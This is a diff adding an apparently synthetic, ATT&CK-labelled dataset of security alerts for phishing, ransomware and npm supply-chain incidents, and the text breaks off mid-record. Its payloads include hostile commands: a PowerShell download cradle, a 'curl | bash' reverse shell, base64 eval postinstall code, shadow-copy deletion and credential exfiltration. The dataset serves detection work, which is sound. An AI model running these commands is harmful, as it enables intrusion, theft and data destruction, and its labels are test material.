@@ -1,0 +1,1005 @@
+[
+  {
+    "event_id": "a1b2c3d4-0001-4000-8000-000000000001",
+    "timestamp": "2024-03-15T08:03:22Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 3,
+    "risk_score": 6.5,
+    "src_ip": "203.0.113.45",
+    "dst_ip": "192.168.10.47",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": "smtp",
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "Spearphishing Attachment Detected",
+    "alert_description": "用户 zhang.wei 收到携带恶意宏文档的钓鱼邮件（发件人伪造为 HR 部门），附件名: 2024薪资调整通知.docm",
+    "raw_payload": {
+      "mail_from": "hr-notice@corp-fake.com",
+      "mail_to": "zhang.wei@corp.local",
+      "subject": "2024薪资调整通知",
+      "attachment": "2024薪资调整通知.docm",
+      "attachment_sha256": "e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "macro_detected": true
+    },
+    "ground_truth": {
+      "tactic": "InitialAccess",
+      "technique_id": "T1566.001",
+      "technique_name": "Spearphishing Attachment"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0002-4000-8000-000000000002",
+    "timestamp": "2024-03-15T08:11:47Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 3,
+    "risk_score": 6.5,
+    "src_ip": "203.0.113.45",
+    "dst_ip": "192.168.10.53",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": "smtp",
+    "user": "li.fang",
+    "hostname": "WORKSTATION-053",
+    "alert_name": "Spearphishing Attachment Detected",
+    "alert_description": "用户 li.fang 收到同一批次钓鱼邮件，附件名: 2024薪资调整通知.docm，用户已打开文件",
+    "raw_payload": {
+      "mail_from": "hr-notice@corp-fake.com",
+      "mail_to": "li.fang@corp.local",
+      "subject": "2024薪资调整通知",
+      "attachment": "2024薪资调整通知.docm",
+      "attachment_sha256": "e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "macro_executed": true
+    },
+    "ground_truth": {
+      "tactic": "InitialAccess",
+      "technique_id": "T1566.001",
+      "technique_name": "Spearphishing Attachment"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0003-4000-8000-000000000003",
+    "timestamp": "2024-03-15T08:17:05Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 8.2,
+    "src_ip": "192.168.10.47",
+    "dst_ip": "192.168.10.1",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "Suspicious PowerShell Base64 Execution",
+    "alert_description": "检测到 PowerShell 执行 base64 编码命令，父进程为 WINWORD.EXE，命令包含 -EncodedCommand 标志，疑似 Office 宏触发的 stage-1 dropper",
+    "raw_payload": {
+      "process": "powershell.exe",
+      "parent_process": "WINWORD.EXE",
+      "pid": 4821,
+      "cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==",
+      "decoded_preview": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/stage2.ps1')",
+      "network_connection": "203.0.113.88:80"
+    },
+    "ground_truth": {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique_name": "PowerShell"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0004-4000-8000-000000000004",
+    "timestamp": "2024-03-15T08:24:33Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 8.2,
+    "src_ip": "192.168.10.53",
+    "dst_ip": "192.168.10.1",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "li.fang",
+    "hostname": "WORKSTATION-053",
+    "alert_name": "Suspicious PowerShell Base64 Execution",
+    "alert_description": "检测到与 WORKSTATION-047 相同的 base64 PowerShell 命令在 WORKSTATION-053 执行，高度关联同一攻击活动",
+    "raw_payload": {
+      "process": "powershell.exe",
+      "parent_process": "WINWORD.EXE",
+      "pid": 3956,
+      "cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==",
+      "decoded_preview": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/stage2.ps1')",
+      "network_connection": "203.0.113.88:80"
+    },
+    "ground_truth": {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique_name": "PowerShell"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0005-4000-8000-000000000005",
+    "timestamp": "2024-03-15T08:41:18Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 7.8,
+    "src_ip": "192.168.10.47",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "Registry Run Key Persistence",
+    "alert_description": "检测到在 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 写入新键值，指向 %APPDATA%\\svcupdate.exe，实现用户登录自启动持久化",
+    "raw_payload": {
+      "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "WindowsSecurityUpdate",
+      "value_data": "%APPDATA%\\svcupdate.exe",
+      "process": "powershell.exe",
+      "pid": 4821
+    },
+    "ground_truth": {
+      "tactic": "Persistence",
+      "technique_id": "T1547.001",
+      "technique_name": "Registry Run Keys / Startup Folder"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0006-4000-8000-000000000006",
+    "timestamp": "2024-03-15T08:55:44Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 3,
+    "risk_score": 7.5,
+    "src_ip": "192.168.10.47",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "Suspicious Scheduled Task Created",
+    "alert_description": "通过 schtasks.exe 创建名为 'MicrosoftEdgeUpdateTaskMachineCore' 的计划任务，每15分钟执行一次 svcupdate.exe，双重持久化保障",
+    "raw_payload": {
+      "process": "schtasks.exe",
+      "cmdline": "schtasks /Create /SC MINUTE /MO 15 /TN MicrosoftEdgeUpdateTaskMachineCore /TR %APPDATA%\\svcupdate.exe /F",
+      "task_name": "MicrosoftEdgeUpdateTaskMachineCore",
+      "trigger": "MINUTE/15",
+      "action": "%APPDATA%\\svcupdate.exe"
+    },
+    "ground_truth": {
+      "tactic": "Persistence",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0007-4000-8000-000000000007",
+    "timestamp": "2024-03-15T10:08:27Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.5,
+    "src_ip": "192.168.10.47",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "LSASS Memory Access Detected",
+    "alert_description": "检测到非系统进程对 lsass.exe 发起内存读取（OpenProcess + ReadProcessMemory），特征与 Mimikatz sekurlsa::logonpasswords 高度吻合",
+    "raw_payload": {
+      "process": "svcupdate.exe",
+      "pid": 6240,
+      "target_process": "lsass.exe",
+      "target_pid": 892,
+      "access_rights": "0x1410",
+      "api_calls": [
+        "OpenProcess",
+        "ReadProcessMemory"
+      ],
+      "memory_bytes_read": 5242880,
+      "mimikatz_signature": true
+    },
+    "ground_truth": {
+      "tactic": "CredentialAccess",
+      "technique_id": "T1003.001",
+      "technique_name": "LSASS Memory"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0008-4000-8000-000000000008",
+    "timestamp": "2024-03-15T10:35:11Z",
+    "source_type": "auth",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 8.8,
+    "src_ip": "192.168.10.47",
+    "dst_ip": "192.168.10.10",
+    "src_port": null,
+    "dst_port": 445,
+    "protocol": "kerberos",
+    "user": "zhang.wei",
+    "hostname": "DC01",
+    "alert_name": "Password Spraying Attack Detected",
+    "alert_description": "从 WORKSTATION-047 对域控 DC01 发起密码喷洒攻击，5分钟内对 47 个不同账户尝试相同密码 'Spring2024!'，成功登录 3 个账户",
+    "raw_payload": {
+      "attack_source": "192.168.10.47",
+      "target_dc": "DC01.corp.local",
+      "attempted_accounts": 47,
+      "failed_attempts": 44,
+      "successful_logins": [
+        "wang.fang",
+        "chen.lei",
+        "liu.yang"
+      ],
+      "password_used": "Spring2024!",
+      "time_window_seconds": 300,
+      "event_ids": [
+        4625,
+        4624
+      ]
+    },
+    "ground_truth": {
+      "tactic": "CredentialAccess",
+      "technique_id": "T1110.003",
+      "technique_name": "Password Spraying"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0009-4000-8000-000000000009",
+    "timestamp": "2024-03-15T11:22:56Z",
+    "source_type": "network",
+    "source_system": "zeek",
+    "severity": 4,
+    "risk_score": 8.5,
+    "src_ip": "192.168.10.47",
+    "dst_ip": "192.168.10.20",
+    "src_port": 49823,
+    "dst_port": 445,
+    "protocol": "smb",
+    "user": "wang.fang",
+    "hostname": "FS01",
+    "alert_name": "SMB Lateral Movement via Admin Share",
+    "alert_description": "检测到从 WORKSTATION-047 通过 SMB Admin Share（\\\\FS01\\ADMIN$）传输并执行可疑 PE 文件，使用刚被盗取的凭据 wang.fang",
+    "raw_payload": {
+      "smb_command": "SMB2_CREATE",
+      "share": "\\\\FS01\\ADMIN$",
+      "filename": "svcupdate.exe",
+      "file_size": 524288,
+      "file_sha256": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
+      "transfer_direction": "write",
+      "followed_by_exec": true
+    },
+    "ground_truth": {
+      "tactic": "LateralMovement",
+      "technique_id": "T1021.002",
+      "technique_name": "SMB/Windows Admin Shares"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0010-4000-8000-000000000010",
+    "timestamp": "2024-03-15T11:48:34Z",
+    "source_type": "auth",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.2,
+    "src_ip": "192.168.10.20",
+    "dst_ip": "192.168.10.10",
+    "src_port": null,
+    "dst_port": 445,
+    "protocol": "ntlm",
+    "user": "administrator",
+    "hostname": "DC01",
+    "alert_name": "Pass-the-Hash Attack Detected",
+    "alert_description": "检测到 Pass-the-Hash 攻击：FS01 上的恶意进程使用 NTLM hash（非明文密码）成功认证到域控 DC01，登录类型为 3（网络登录），源进程为非交互式会话",
+    "raw_payload": {
+      "logon_type": 3,
+      "auth_package": "NTLM",
+      "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
+      "source_host": "FS01.corp.local",
+      "target_host": "DC01.corp.local",
+      "account": "administrator",
+      "logon_id": "0x3e7",
+      "event_id": 4624
+    },
+    "ground_truth": {
+      "tactic": "LateralMovement",
+      "technique_id": "T1550.002",
+      "technique_name": "Pass the Hash"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0011-4000-8000-000000000011",
+    "timestamp": "2024-03-15T14:03:19Z",
+    "source_type": "network",
+    "source_system": "zeek",
+    "severity": 4,
+    "risk_score": 8.0,
+    "src_ip": "192.168.10.47",
+    "dst_ip": "203.0.113.88",
+    "src_port": 52341,
+    "dst_port": 443,
+    "protocol": "https",
+    "user": "zhang.wei",
+    "hostname": "WORKSTATION-047",
+    "alert_name": "C2 Beacon Communication Detected",
+    "alert_description": "检测到 WORKSTATION-047 与已知 C2 IP (203.0.113.88) 建立周期性 HTTPS 连接，心跳间隔 300±30秒，JA3 指纹与 CobaltStrike 匹配",
+    "raw_payload": {
+      "c2_ip": "203.0.113.88",
+      "c2_domain": "update-cdn.microsoftserv.com",
+      "beacon_interval_seconds": 300,
+      "jitter_percent": 10,
+      "ja3_fingerprint": "e7d705a3286e19ea42f587b6bc57cdf8",
+      "cobalt_strike_match": true,
+      "total_connections": 28,
+      "data_transferred_bytes": 45678
+    },
+    "ground_truth": {
+      "tactic": "CommandAndControl",
+      "technique_id": "T1071.001",
+      "technique_name": "Web Protocols"
+    }
+  },
+  {
+    "event_id": "a1b2c3d4-0012-4000-8000-000000000012",
+    "timestamp": "2024-03-15T18:27:44Z",
+    "source_type": "network",
+    "source_system": "firewall",
+    "severity": 4,
+    "risk_score": 8.3,
+    "src_ip": "192.168.10.10",
+    "dst_ip": "203.0.113.88",
+    "src_port": 61023,
+    "dst_port": 8443,
+    "protocol": "tls",
+    "user": "administrator",
+    "hostname": "DC01",
+    "alert_name": "Encrypted C2 Channel on Non-Standard Port",
+    "alert_description": "域控 DC01 上的恶意进程通过非标准端口 8443 建立 TLS 加密 C2 通道，使用自定义加密协议（非标准 TLS cipher suite），总外传数据 128MB",
+    "raw_payload": {
+      "c2_ip": "203.0.113.88",
+      "port": 8443,
+      "tls_version": "TLS 1.3",
+      "cipher_suite": "custom_non_standard",
+      "cert_subject": "CN=update-cdn.microsoftserv.com",
+      "cert_issuer": "CN=update-cdn.microsoftserv.com",
+      "self_signed": true,
+      "data_egress_bytes": 134217728
+    },
+    "ground_truth": {
+      "tactic": "CommandAndControl",
+      "technique_id": "T1573.001",
+      "technique_name": "Symmetric Cryptography"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0001-4000-8000-000000000001",
+    "timestamp": "2024-04-22T14:05:33Z",
+    "source_type": "network",
+    "source_system": "snort",
+    "severity": 3,
+    "risk_score": 6.0,
+    "src_ip": "192.168.20.88",
+    "dst_ip": "192.168.20.0/24",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": "tcp",
+    "user": null,
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Internal Network Port Scan Detected",
+    "alert_description": "检测到 192.168.20.88 对 192.168.20.0/24 网段 254 个主机发起全端口扫描，5分钟内产生 127,000 个 SYN 包，使用 Masscan 工具特征",
+    "raw_payload": {
+      "scan_type": "SYN_SCAN",
+      "target_network": "192.168.20.0/24",
+      "target_count": 254,
+      "ports_scanned": "1-65535",
+      "packets_per_second": 423,
+      "total_syn_packets": 127000,
+      "scanner_signature": "masscan",
+      "open_ports_found": [
+        135,
+        139,
+        445,
+        3389,
+        5985
+      ]
+    },
+    "ground_truth": {
+      "tactic": "Discovery",
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0002-4000-8000-000000000002",
+    "timestamp": "2024-04-22T14:28:17Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 2,
+    "risk_score": 5.0,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Mass File System Enumeration",
+    "alert_description": "检测到大量文件系统枚举操作，15分钟内访问超过 50,000 个文件路径，目标为文档、数据库、备份文件（.docx .xlsx .mdb .bak），疑为加密前目标识别",
+    "raw_payload": {
+      "process": "conhost.exe",
+      "pid": 7832,
+      "files_enumerated": 50234,
+      "target_extensions": [
+        ".docx",
+        ".xlsx",
+        ".pdf",
+        ".mdb",
+        ".bak",
+        ".sql"
+      ],
+      "directories_scanned": [
+        "C:\\Users",
+        "D:\\Data",
+        "\\\\FS01\\Finance"
+      ],
+      "time_window_seconds": 900
+    },
+    "ground_truth": {
+      "tactic": "Discovery",
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0003-4000-8000-000000000003",
+    "timestamp": "2024-04-22T14:44:52Z",
+    "source_type": "network",
+    "source_system": "zeek",
+    "severity": 3,
+    "risk_score": 5.5,
+    "src_ip": "192.168.20.88",
+    "dst_ip": "192.168.20.10",
+    "src_port": 49901,
+    "dst_port": 445,
+    "protocol": "smb",
+    "user": "local_admin",
+    "hostname": "FS01",
+    "alert_name": "Network Share Enumeration",
+    "alert_description": "检测到自动化网络共享枚举，在3分钟内对域内 18 台服务器执行 NetShareEnum，发现 47 个可写共享，为勒索软件横向扩散做准备",
+    "raw_payload": {
+      "smb_command": "SRVSVC_NetShareEnum",
+      "targets_enumerated": 18,
+      "shares_discovered": 47,
+      "writable_shares": 31,
+      "shares": [
+        "\\\\FS01\\Finance",
+        "\\\\FS01\\HR",
+        "\\\\FS01\\Backup",
+        "\\\\DC01\\SYSVOL"
+      ],
+      "tool_signature": "net view"
+    },
+    "ground_truth": {
+      "tactic": "Discovery",
+      "technique_id": "T1135",
+      "technique_name": "Network Share Discovery"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0004-4000-8000-000000000004",
+    "timestamp": "2024-04-22T15:12:38Z",
+    "source_type": "auth",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 7.8,
+    "src_ip": "192.168.20.88",
+    "dst_ip": "192.168.20.10",
+    "src_port": 53201,
+    "dst_port": 3389,
+    "protocol": "rdp",
+    "user": "local_admin",
+    "hostname": "FS01",
+    "alert_name": "RDP Lateral Movement Detected",
+    "alert_description": "检测到从 WORKSTATION-088 通过 RDP 依次登录 12 台服务器，使用相同的本地管理员凭据，登录后立即执行批处理脚本",
+    "raw_payload": {
+      "rdp_source": "192.168.20.88",
+      "targets_accessed": [
+        "192.168.20.10",
+        "192.168.20.11",
+        "192.168.20.12"
+      ],
+      "total_targets": 12,
+      "user": "local_admin",
+      "logon_type": 10,
+      "post_login_action": "cmd.exe /c C:\\Windows\\Temp\\install.bat",
+      "event_id": 4624
+    },
+    "ground_truth": {
+      "tactic": "LateralMovement",
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Desktop Protocol"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0005-4000-8000-000000000005",
+    "timestamp": "2024-04-22T15:48:21Z",
+    "source_type": "network",
+    "source_system": "zeek",
+    "severity": 5,
+    "risk_score": 9.0,
+    "src_ip": "192.168.20.88",
+    "dst_ip": "192.168.20.20",
+    "src_port": 55112,
+    "dst_port": 445,
+    "protocol": "smb",
+    "user": "local_admin",
+    "hostname": "WORKSTATION-020",
+    "alert_name": "Ransomware Payload Distribution via SMB",
+    "alert_description": "检测到通过 SMB 向 31 台主机的可写共享批量写入同一可执行文件（lockbit3.exe），文件大小完全相同，疑为勒索软件载荷部署",
+    "raw_payload": {
+      "payload_name": "lockbit3.exe",
+      "payload_sha256": "4d186321c1a7f0f354b297e8914ab240",
+      "target_share": "\\\\*\\C$",
+      "hosts_infected": 31,
+      "file_size_bytes": 1048576,
+      "deployment_method": "SMB write + remote exec via WMI"
+    },
+    "ground_truth": {
+      "tactic": "LateralMovement",
+      "technique_id": "T1021.002",
+      "technique_name": "SMB/Windows Admin Shares"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0006-4000-8000-000000000006",
+    "timestamp": "2024-04-22T16:33:09Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 7.5,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Mass Data Collection Before Encryption",
+    "alert_description": "勒索软件在加密前收集高价值文件，将 Finance、HR 等目录下的 23,000 个文件（总计 48GB）复制到本地暂存目录 C:\\Windows\\Temp\\stg\\",
+    "raw_payload": {
+      "process": "lockbit3.exe",
+      "pid": 9012,
+      "files_collected": 23000,
+      "total_size_gb": 48,
+      "staging_path": "C:\\Windows\\Temp\\stg\\",
+      "source_paths": [
+        "\\\\FS01\\Finance",
+        "\\\\FS01\\HR",
+        "\\\\DC01\\Backup"
+      ],
+      "collection_rate_mb_per_sec": 85
+    },
+    "ground_truth": {
+      "tactic": "Collection",
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0007-4000-8000-000000000007",
+    "timestamp": "2024-04-22T17:15:44Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 3,
+    "risk_score": 7.0,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Data Staged in Temp Directory",
+    "alert_description": "检测到在 C:\\Windows\\Temp\\stg\\ 创建大量压缩归档文件（.zip），命名规则为 data_YYYYMMDD_NNN.zip，共 48 个文件，总计 15GB，疑为双重勒索外传前准备",
+    "raw_payload": {
+      "staging_dir": "C:\\Windows\\Temp\\stg\\",
+      "archive_count": 48,
+      "total_size_gb": 15,
+      "archive_naming": "data_20240422_*.zip",
+      "compression_tool": "7z.exe",
+      "encryption_flag": true,
+      "archive_password": "Lb3#2024!"
+    },
+    "ground_truth": {
+      "tactic": "Collection",
+      "technique_id": "T1074.001",
+      "technique_name": "Local Data Staging"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0008-4000-8000-000000000008",
+    "timestamp": "2024-04-22T19:02:17Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 10.0,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Mass File Encryption - Ransomware Activity",
+    "alert_description": "检测到大规模文件加密操作，lockbit3.exe 在 45 台主机上同步加密文件，文件扩展名变更为 .lockbit，加密速度 2500文件/分钟，总计影响 340,000 个文件",
+    "raw_payload": {
+      "process": "lockbit3.exe",
+      "encryption_extension": ".lockbit",
+      "files_encrypted": 340000,
+      "hosts_affected": 45,
+      "encryption_rate_files_per_min": 2500,
+      "encryption_algorithm": "AES-256 + RSA-2048",
+      "ransom_note_created": "!!READ_ME!!.txt",
+      "wallpaper_changed": true
+    },
+    "ground_truth": {
+      "tactic": "Impact",
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0009-4000-8000-000000000009",
+    "timestamp": "2024-04-22T19:18:55Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.8,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Volume Shadow Copy Deletion Detected",
+    "alert_description": "检测到通过 vssadmin.exe 删除所有卷影副本，命令: vssadmin delete shadows /all /quiet，同时禁用 Windows 备份服务，阻止系统恢复",
+    "raw_payload": {
+      "process": "vssadmin.exe",
+      "cmdline": "vssadmin.exe delete shadows /all /quiet",
+      "shadows_deleted": 24,
+      "backup_service_disabled": true,
+      "system_restore_disabled": true,
+      "bcdedit_called": true,
+      "bcdedit_args": [
+        "bcdedit /set {default} recoveryenabled No",
+        "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+      ]
+    },
+    "ground_truth": {
+      "tactic": "Impact",
+      "technique_id": "T1490",
+      "technique_name": "Inhibit System Recovery"
+    }
+  },
+  {
+    "event_id": "b2c3d4e5-0010-4000-8000-000000000010",
+    "timestamp": "2024-04-22T22:24:38Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.5,
+    "src_ip": "192.168.20.88",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "local_admin",
+    "hostname": "WORKSTATION-088",
+    "alert_name": "Ransom Note File Created on Multiple Hosts",
+    "alert_description": "检测到在 45 台主机的每个目录下均创建勒索说明文件 '!!READ_ME!!.txt'，包含 Tor 支付链接和 72 小时倒计时，加密文件总量 340,000 个",
+    "raw_payload": {
+      "ransom_note_name": "!!READ_ME!!.txt",
+      "ransom_note_count": 12450,
+      "hosts_affected": 45,
+      "tor_payment_url": "http://lockbit3olp7oetlc.onion/pay/CORP-2024-0422",
+      "bitcoin_address": "bc1qxy2kgdygjrsqtzq2n0yrf249",
+      "ransom_amount_btc": 25.5,
+      "deadline_hours": 72,
+      "files_encrypted": 340000
+    },
+    "ground_truth": {
+      "tactic": "Impact",
+      "technique_id": "T1491.001",
+      "technique_name": "Internal Defacement"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0001-4000-8000-000000000001",
+    "timestamp": "2024-05-08T02:13:44Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 8.0,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "104.16.88.20",
+    "src_port": 52001,
+    "dst_port": 443,
+    "protocol": "https",
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Malicious npm Package Pulled by Build Server",
+    "alert_description": "构建服务器 BUILD-SRV-01 在 CI/CD 流水线中拉取了被投毒的 npm 包 'core-utils-helper@3.2.1'，该包包含混淆的后门代码，与已知供应链攻击 IOC 匹配",
+    "raw_payload": {
+      "package_name": "core-utils-helper",
+      "package_version": "3.2.1",
+      "package_sha256": "malicious_hash_abc123def456",
+      "npm_registry": "https://registry.npmjs.org",
+      "install_path": "/app/node_modules/core-utils-helper",
+      "postinstall_script": "node ./scripts/setup.js",
+      "malicious_code_detected": true,
+      "obfuscation_detected": true,
+      "pipeline_job": "frontend-build-prod"
+    },
+    "ground_truth": {
+      "tactic": "InitialAccess",
+      "technique_id": "T1195.002",
+      "technique_name": "Compromise Software Supply Chain"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0002-4000-8000-000000000002",
+    "timestamp": "2024-05-08T02:31:22Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 4,
+    "risk_score": 8.5,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "104.16.88.20",
+    "src_port": 52045,
+    "dst_port": 443,
+    "protocol": "https",
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Second Malicious Dependency Package Detected",
+    "alert_description": "同一流水线还拉取了 'request-validator@1.0.4'，该包是合法包的 typosquat 版本，postinstall 脚本使用 eval() 执行 base64 编码的 shellcode",
+    "raw_payload": {
+      "package_name": "request-validator",
+      "package_version": "1.0.4",
+      "legitimate_package": "req-validator@2.1.0",
+      "typosquat_similarity": 0.91,
+      "postinstall_script": "node -e \"eval(Buffer.from('aWYocHJvY2Vzcy5lbnY...','base64').toString())\"",
+      "shellcode_detected": true,
+      "pipeline_job": "frontend-build-prod"
+    },
+    "ground_truth": {
+      "tactic": "InitialAccess",
+      "technique_id": "T1195.002",
+      "technique_name": "Compromise Software Supply Chain"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0003-4000-8000-000000000003",
+    "timestamp": "2024-05-08T02:47:08Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.0,
+    "src_ip": "192.168.30.5",
+    "dst_ip": "198.51.100.77",
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Malicious Postinstall Script Execution in CI Pipeline",
+    "alert_description": "恶意 npm 包的 postinstall 脚本在构建服务器上执行 bash 命令，下载并执行远程 shell 脚本，建立反向 Shell 连接到攻击者控制的服务器",
+    "raw_payload": {
+      "process": "node",
+      "pid": 14523,
+      "parent": "npm install",
+      "cmdline": "bash -c 'curl -s https://198.51.100.77/init.sh | bash'",
+      "reverse_shell_ip": "198.51.100.77",
+      "reverse_shell_port": 4444,
+      "shell_established": true,
+      "env_vars_accessed": [
+        "NPM_TOKEN",
+        "AWS_ACCESS_KEY_ID",
+        "GITHUB_TOKEN",
+        "CI_JOB_TOKEN"
+      ]
+    },
+    "ground_truth": {
+      "tactic": "Execution",
+      "technique_id": "T1059.004",
+      "technique_name": "Unix Shell"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0004-4000-8000-000000000004",
+    "timestamp": "2024-05-08T03:08:55Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 5,
+    "risk_score": 9.3,
+    "src_ip": "192.168.30.5",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
+    "alert_name": "Native API Credential Harvesting",
+    "alert_description": "恶意进程通过系统原生 API 读取构建环境中的所有 CI/CD 凭据，包括 GitHub Token、AWS Key、NPM Token 等，并将凭据以 base64 编码发送到 C2 服务器",
+    "raw_payload": {
+      "process": "node",
+      "pid": 14523,
+      "api_calls": [
+        "getenv",
+        "read(/proc/self/environ)",
+        "read(~/.npmrc)",
+        "read(~/.aws/credentials)"
+      ],
+      "credentials_harvested": {
+        "GITHUB_TOKEN": "ghp_****",
+        "NPM_TOKEN": "npm_****",
+        "AWS_ACCESS_KEY_ID": "AKIA****"
+      },
+      "exfil_method": "HTTP POST base64 encoded",
+      "exfil_destination": "198.51.100.77:443"
+    },
+    "ground_truth": {
+      "tactic": "Execution",
+      "technique_id": "T1106",
+      "technique_name": "Native API"
+    }
+  },
+  {
+    "event_id": "c3d4e5f6-0005-4000-8000-000000000005",
+    "timestamp": "2024-05-08T04:22:13Z",
+    "source_type": "endpoint",
+    "source_system": "edr",
+    "severity": 3,
+    "risk_score": 7.0,
+    "src_ip": "192.168.30.5",
+    "dst_ip": null,
+    "src_port": null,
+    "dst_port": null,
+    "protocol": null,
+    "user": "ci_runner",
+    "hostname": "BUILD-SRV-01",
